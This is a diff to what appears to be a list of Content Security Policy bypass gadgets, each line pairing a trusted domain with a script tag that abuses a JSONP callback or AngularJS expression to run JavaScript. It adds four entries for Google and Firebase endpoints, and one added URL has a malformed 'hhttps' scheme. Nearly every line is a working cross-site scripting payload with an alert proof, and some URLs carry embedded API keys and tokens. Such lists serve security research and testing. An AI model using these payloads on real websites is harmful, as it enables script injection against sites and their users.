@@ -84,6 +84,7 @@ client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?cal
 clientauthconfig.clients6.google.com  <script src="https://clientauthconfig.clients6.google.com/v1/clients?callback=alert(1)"></script>
 clients1.google.com	<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
 clients6.google.com	<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
+clients6.google.com	<script src="https://clients6.google.com/drive/v2internal/apps?openDrive=true&reason=301&syncType=0&errorRecovery=false&fields=kind%2CdefaultAppIds%2Citems%28kind%2Cid%2CuseByDefault%2Cname%2CopenUrlTemplate%2CprimaryMimeTypes%2CsecondaryMimeTypes%2CcreateUrl%2CcreateInFolderTemplate%2CobjectType%2CsupportsCreate%2CsupportsImport%2CsupportsMultiOpen%2CsupportsOfflineCreate%2Cinstalled%2Cauthorized%2CproductUrl%2CprimaryFileExtensions%2CsecondaryFileExtensions%2CshortDescription%2ClongDescription%2CproductId%2Cremovable%2Cicons%28iconUrl%2Csize%2Ccategory%29%2Ctype%2CchromeExtensionIds%2CrequiresAuthorizationBeforeOpenWith%2ChasDriveWideScope%2CdriveBranded%2CdriveSource%2CsupportsMobileBrowser%2CsupportsTeamDrives%2ChasGsmListing%29&languageCode=en&retryCount=0&dsNonce=cfgr2b5makyz&key=AIzaSyDLol3l87BBbfa-oQPI1b_5ymSTx8j30Ik&callback=alert(1)-1;"></script>
 cloudinary.com	<script src="https://cloudinary.com/wp-json?_jsonp=alert"></script>
 cloudusersettings-pa.clients6.google.com  <script src="https://cloudusersettings-pa.clients6.google.com/v1alpha1/settings/CONSOLE_PINS/keys/CLOUD?callback=alert(1)"></script>
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
@@ -114,6 +115,7 @@ e.cquotient.com  <script src="https://e.cquotient.com/recs/bflp-Wells/cart_recom
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>
+firebase.googleapis.com	<script src="https://firebase.googleapis.com/v1alpha/projects/-/apps/1:789788471140:web:7e31b15959d68ac0a51471/webConfig?callback=alert(1)-1;"></script>
 foremedia.net	<script src="https://foremedia.net/wp-json?_jsonp=alert"></script>
 forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>
 forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>
@@ -167,6 +169,7 @@ maps.google.de	<script src="https://maps.google.de/maps/api/js?sensor=false&call
 maps.google.lv	<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>
 maps.google.ru	<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>
 maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>
+maps.googleapis.com	<script src="hhttps://maps.googleapis.com/maps/vt?pb=%211m4%211m3%211i10%212i724%213i439%211m4%211m3%211i10%212i720%213i440%211m4%211m3%211i10%212i720%213i441%211m4%211m3%211i10%212i721%213i440%211m4%211m3%211i10%212i721%213i441%211m4%211m3%211i10%212i722%213i440%211m4%211m3%211i10%212i722%213i441%211m4%211m3%211i10%212i723%213i440%211m4%211m3%211i10%212i723%213i441%211m4%211m3%211i10%212i724%213i440%211m4%211m3%211i10%212i724%213i441%212m3%211e0%212sm%213i773537128%213m13%212sen%213sIN%215e18%2112m5%211e68%212m2%211sset%212sRoadmap%214e2%2112m3%211e37%212m1%211ssmartmaps%214e3%2112m1%215b1%2123i46991212%2123i47054750&callback=alert(10)//&client=google-maps-pro&token=124706"></script>
 mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>
 monitoring.clients6.google.com  <script src="https://monitoring.clients6.google.com/v3/projects/gen-lang-client-1/groups?callback=alert(1)"></script>
 mouseflow.com	<script src="https://mouseflow.com/wp-json?_jsonp=alert"></script>
@@ -281,6 +284,7 @@ www.ecwid.com   <script src="https://www.ecwid.com/wp-json?_jsonp=alert"></scrip
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
+www.google.com	<script src='https://www.google.com/maps/vt?pb=%211m8%213m7%211m2%211u5376%212u3328%212m2%211u768%212u512%213i5%212m3%211e0%212sm%213i-1%213m3%212sen-IN%213sIN%215e1270%214e4%2111m2%211e2%212b1%2123i72259375%2123i72732929%2123i227337&callback=alert(10);//'></script>
 www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
